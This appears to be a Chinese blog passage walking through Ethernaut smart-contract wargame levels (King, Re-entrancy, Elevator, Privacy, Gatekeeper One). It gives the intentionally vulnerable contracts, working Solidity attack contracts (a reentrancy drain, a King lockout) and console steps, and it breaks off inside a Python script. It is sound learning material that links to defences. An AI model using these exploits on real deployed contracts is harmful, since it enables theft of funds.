<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    payable(king).transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>搞了一下多线程，好像不太行</p>
<p>提交一次可以把<code>prize</code>清零，盲猜是<code>owner</code>转了个<code>value=0</code>，由于<code>msg.sender == owner</code>所以一定能过<code>require</code>，防不住啊</p>
<p>在<code>king = msg.sender</code>前还夹了个<code>transfer</code>，所以转换一下思路，如果可以引发<code>transfer</code>报错，就不会执行<code>king = msg.sender</code>，而前面<code>Force</code>里提了“没有<code>receive</code>函数的话转钱好像会报错”，所以搞个没有<code>receive</code>的攻击合约向题目合约打钱即可</p>
<p>由于没有<code>receive</code>，所以在攻击合约中用<code>transfer</code>会报错，可以转用<code>call</code>函数然后设<code>value</code>，另把<code>constructor</code>设<code>payable</code>可以在Remix部署时转入钱，不过由于可以把<code>prize</code>清零所以在这里用处并不大</p>
<p>攻击合约：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  address payable vicAddr = payable(0x400890FeB77E0e555D02f8969CA00850f65B96D2);</span><br><span class="line"></span><br><span class="line">  constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function hack() public payable returns(bytes memory) &#123;</span><br><span class="line">    (bool success, bytes memory data) = vicAddr.call&#123;value: msg.value&#125;(&#x27;&#x27;);</span><br><span class="line">    require(success);</span><br><span class="line">    return data;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function ng() public payable &#123;</span><br><span class="line">    vicAddr.transfer(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先看原<code>king</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract._king()</span><br><span class="line"><span class="comment">// &#x27;0x9A676e781A523b5d0C0e43731313A708CB607508&#x27;</span></span><br><span class="line">(<span class="keyword">await</span> contract.prize()).words[<span class="number">0</span>]</span><br><span class="line"><span class="comment">// 13008896</span></span><br></pre></td></tr></table></figure>
<p>提交一下，没通过但是无所谓，再看看<code>prize</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">await</span> contract.prize()).words[<span class="number">0</span>]</span><br><span class="line"><span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<p>归零了，然后部署攻击合约，</p>
<p>调<code>ng</code>的话会NG，因为没有<code>receive</code>，可以调<code>call</code>，设个<code>0</code>以上的<code>value</code>然后<code>hack</code>即可</p>
<p>PS：后来试过即使有<code>receive</code>，如果<code>receive</code>里面的逻辑太复杂也会退回，因为<code>transfer</code>有2300的Gas限制</p>
<p>再看看<code>king</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract._king()</span><br><span class="line"><span class="comment">// &#x27;0x95775fD3Afb1F4072794CA4ddA27F2444BCf8Ac3&#x27;</span></span><br></pre></td></tr></table></figure>
<p>变成了合约地址，这时向题目合约转点钱看看</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.send(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>如无意外会报<code>Transaction reverted without a reason string</code>，然后提交即可</p>
<img src="/p/Ethernaut-note/image-20230921152533902.png" class="" title="img_image-20230921152533902">
<p>参见: <a target="_blank" rel="noopener" href="https://www.kingoftheether.com/thrones/kingoftheether/index.html">King of the Ether</a> 和 <a target="_blank" rel="noopener" href="http://www.kingoftheether.com/postmortem.html">King of the Ether Postmortem</a></p>
<h1 id="10-Re-entrancy">10_Re-entrancy<a class="anchor" href="#10-Re-entrancy">·</a></h1>
<p>这一关的目标是偷走合约的所有资产.</p>
<p>这些可能有帮助:</p>
<ul>
<li>不可信的合约可以在你意料之外的地方执行代码.</li>
<li>Fallback methods</li>
<li>抛出/恢复 bubbling</li>
<li>有的时候攻击一个合约的最好方式是使用另一个合约.</li>
<li>查看上方帮助页面, <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/help">“Beyond the console”</a> 部分</li>
</ul>
<p>题目代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由题目名可知是重入攻击，关于重入攻击，在<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/tree/main/S01_ReentrancyAttack">WTF-Solidity</a>上有很详细的介绍，建议去康康</p>
<p>大概意思是，在题目合约向我攻击合约转账时，会调用攻击合约的<code>receive</code>或<code>fallback</code>函数，在<code>receive</code>或<code>fallback</code>执行完毕后才会继续<code>call</code>后面的操作，</p>
<p>注意到扣款操作（<code>balances[msg.sender] -= _amount</code>）在<code>call</code>之后，所以如果攻击合约的<code>receive</code>或<code>fallback</code>中也调用<code>withdraw</code>，则会在<code>call</code>还没结束时调用<code>withdraw</code>，于是可实现在上一笔<code>withdraw</code>还没扣款就又可以取款</p>
<p>然后这一笔<code>withdraw</code>里的<code>call</code>又触发我<code>receive</code>或<code>fallback</code>中的<code>withdraw</code>，所以可以达到循环提款且不用扣款</p>
<p>偷一个图方便理解</p>
<img src="/p/Ethernaut-note/image-20230921170028839.png" class="" title="img_image-20230921170028839">
<p>顺便偷一个<code>receive</code>和<code>fallback</code>的调用逻辑</p>
<img src="/p/Ethernaut-note/image-20230921170122701.png" class="" title="img_image-20230921170122701">
<p>理解原理后开始攻击，先看看题目合约余额</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getBalance(contract.address)</span><br><span class="line"><span class="comment">// &#x27;1000000000000000&#x27;</span></span><br></pre></td></tr></table></figure>
<p>数额不大，设个<code>value = 1000000000000000</code>，一次抽干</p>
<p>攻击合约：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Reentrance &#123;</span><br><span class="line">  function balances() external;</span><br><span class="line">  function donate(address _to) payable external;</span><br><span class="line">  function balanceOf(address _who) view external;</span><br><span class="line">  function withdraw(uint _amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  Reentrance r;</span><br><span class="line">  address payable vicAddr = payable(0x524F04724632eED237cbA3c37272e018b3A7967e);</span><br><span class="line">  uint value = 1000000000000000;</span><br><span class="line"></span><br><span class="line">  constructor() payable &#123;</span><br><span class="line">    r = Reentrance(vicAddr);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function hack() public payable &#123;</span><br><span class="line">    r.donate&#123;value: value&#125;(address(this));</span><br><span class="line">    r.withdraw(value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    if (vicAddr.balance &gt; 0) &#123;</span><br><span class="line">      r.withdraw(value);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>部署时记得转入<code>1000000000000000 Wei</code></p>
<p><code>hack</code>后再看余额</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getBalance(contract.address)</span><br><span class="line"><span class="comment">// &#x27;0&#x27;</span></span><br></pre></td></tr></table></figure>
<p>归零，提交</p>
<img src="/p/Ethernaut-note/image-20230921170329614.png" class="" title="img_image-20230921170329614">
<ul>
<li><a target="_blank" rel="noopener" href="https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern">Checks-Effects-Interactions pattern</a></li>
<li>比如 <a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard">ReentrancyGuard</a> 或 <a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment">PullPayment</a></li>
<li>合约 <a target="_blank" rel="noopener" href="https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/">Source 1</a> <a target="_blank" rel="noopener" href="https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742">Source 2</a>.</li>
<li>参见 <a target="_blank" rel="noopener" href="https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942">15 lines of code that could have prevented TheDAO Hack</a>.</li>
</ul>
<h1 id="11-Elevator">11_Elevator<a class="anchor" href="#11-Elevator">·</a></h1>
<p>电梯不会让你达到大楼顶部, 对吧?</p>
<p>这可能有帮助:</p>
<ul>
<li>有的时候 solidity 不是很擅长保存 promises.</li>
<li>这个 <code>电梯</code> 期待被用在一个 <code>建筑</code> 里.</li>
</ul>
<p>题目代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Building(msg.sender)</code>传入的是我的地址，所以可以控制<code>isLastFloor</code></p>
<p>然后看要求是对于同一个输入，<code>isLastFloor</code>第一次要返回<code>false</code>，第二次返回<code>true</code>，那就与输入无关就好了</p>
<p>攻击合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Elevator &#123;</span><br><span class="line">  function top() external;</span><br><span class="line">  function floor() external;</span><br><span class="line">  function goTo(uint _floor) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Building &#123;</span><br><span class="line">  Elevator e;</span><br><span class="line">  address vicAddr = 0x033488800Ae672726c34620D4Bd817E1590d4cDc;</span><br><span class="line">  bool coin = true;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    e = Elevator(vicAddr);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function isLastFloor(uint f) public returns (bool) &#123;</span><br><span class="line">    coin = !coin;</span><br><span class="line">    return coin;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function hack() public &#123;</span><br><span class="line">    e.goTo(1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>部署时会报<code>Warning: Unused function parameter</code>，不用管</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.top()</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>提交</p>
<img src="/p/Ethernaut-note/image-20230921174230019.png" class="" title="img_image-20230921174230019">
<p>阅读 <a target="_blank" rel="noopener" href="http://solidity.readthedocs.io/en/develop/contracts.html#view-functions">Solidity’s documentation</a></p>
<h1 id="12-Privacy">12_Privacy<a class="anchor" href="#12-Privacy">·</a></h1>
<p>这个合约的制作者非常小心的保护了敏感区域的 storage.</p>
<p>解开这个合约来完成这一关.</p>
<p>这些可能有帮助:</p>
<ul>
<li>理解 storage 的原理</li>
<li>理解 parameter parsing 的原理</li>
<li>理解 casting 的原理</li>
</ul>
<p>Tips:</p>
<ul>
<li>记住 metamask 只是个普通的工具. 如果它有问题,可以使用别的工具. 进阶的操作应该包括 remix, 或是你自己的 web3 提供者.</li>
</ul>
<p>题目代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = true;</span><br><span class="line">  uint256 public ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = 10;</span><br><span class="line">  uint8 private denomination = 255;</span><br><span class="line">  uint16 private awkwardness = uint16(block.timestamp);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key == bytes16(data[2]));</span><br><span class="line">    locked = false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先根据<a href="https://tover.xyz/p/Ethernaut-note/#08-Vault">Vault</a>知道可以使用<code>web3.eth.getStorageAt</code>获取合约的内存，问题就剩下怎么找到<code>bytes16(data[2])</code>了</p>
<p>首先看看Solidity的内存分布，可以参考<a target="_blank" rel="noopener" href="https://learnblockchain.cn/books/geth/part7/storage.html#%E7%B4%A7%E5%87%91%E5%AD%98%E5%82%A8">这里</a>的紧凑存储，大概意思是内存中存到Slot的顺序和代码中指定的顺序一致，但是存的时候会在保证顺序的前提下尽量把一个Slot填满，即如果可以找到两个（定长）变量合起来长度小于256 bits的话，就会把两个存在同一个Slot，靠前面的变量会存在内存较低的位置</p>
<p>分析一下可得这个合约的内存为（注：地址<code>255 -&gt; 0</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0: 0(255) | locked(1)</span><br><span class="line">1: ID(256)</span><br><span class="line">2: 0(224) | awkwardness(16) | denomination(8) | flattening(8)</span><br><span class="line">3: data[0](256)</span><br><span class="line">4: data[1](256)</span><br><span class="line">5: data[2](256)</span><br></pre></td></tr></table></figure>
<p>这样的话<code>data[2]</code>就应该拿<code>web3.eth.getStorageAt(contract.address, 5)</code></p>
<p>但实际上解锁需要的是<code>bytes16(data[2])</code>，所以还需要一个类型转换</p>
<p>根据<a target="_blank" rel="noopener" href="https://learnblockchain.cn/article/6446">这里</a>的说法，Solidity中<code>bytes</code>是从高位填起，转换的话应该是拿<code>data[2]</code>的高16字节</p>
<p>所以</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> res = <span class="string">&#x27;0x&#x27;</span> + (<span class="keyword">await</span> web3.eth.getStorageAt(contract.address, <span class="number">5</span>)).substr(<span class="number">2</span>, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">await</span> contract.unlock(res);</span><br><span class="line">(<span class="keyword">await</span> contract.locked()).toString()</span><br><span class="line"><span class="comment">// &#x27;false&#x27;</span></span><br></pre></td></tr></table></figure>
<p>提交即可</p>
<img src="/p/Ethernaut-note/image-20231012153950058.png" class="" title="img_image-20231012153950058">
<p>文章: <a target="_blank" rel="noopener" href="https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925">How to read Ethereum contract storage</a></p>
<h1 id="13-Gatekeeper-One">13_Gatekeeper One<a class="anchor" href="#13-Gatekeeper-One">·</a></h1>
<p>越过守门人并且注册为一个参赛者来完成这一关.</p>
<p>这可能有帮助:</p>
<ul>
<li>想一想你在 Telephone 和 Token 关卡学到的知识.</li>
<li>你可以在 solidity 文档中更深入的了解 <code>gasleft()</code> 函数 (参见 <a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html">here</a> 和 <a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls">here</a>).</li>
</ul>
<p>题目代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft() % 8191 == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="GateOne">GateOne<a class="anchor" href="#GateOne">·</a></h2>
<p><code>gateOne</code>其实就是前面的<a href="https://tover.xyz/p/Ethernaut-note/#04-Telephone">Telephone</a>，抄过来即可。</p>
<p>但攻击合约我改了一下，为了在调试中减少合约部署的次数，把攻击对象地址等都设成了变量</p>
<p><code>hack.sol</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperOne  &#123;</span><br><span class="line">  function enter(bytes8 _gateKey) payable external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function hack(uint256 g, address a, bytes8 b) public &#123;</span><br><span class="line">    address vicAddr = payable(a);</span><br><span class="line">    GatekeeperOne go = GatekeeperOne(vicAddr);</span><br><span class="line">    go.enter&#123;gas: g&#125;(b);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="GateTwo">GateTwo<a class="anchor" href="#GateTwo">·</a></h2>
<p>大概是到<code>gateTwo</code>函数的<code>require</code>里，剩下的<code>gas</code>要是<code>8191</code>的倍数，其实这里枚举输入进去的<code>gas</code>即可。</p>
<p>实际操作过程中会有一些坑，第一坑是，如果用MateMask交易的话，他好像会帮我计算一个最节省的<code>gas</code>，导致<code>hack</code>里面的<code>&#123;gas: g&#125;</code>不起作用，估计是太抠了，到<code>go.enter&#123;gas: g&#125;(b)</code>这里不够<code>gas</code>了？</p>
<p>用Python打则没问题，所以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">chainId = <span 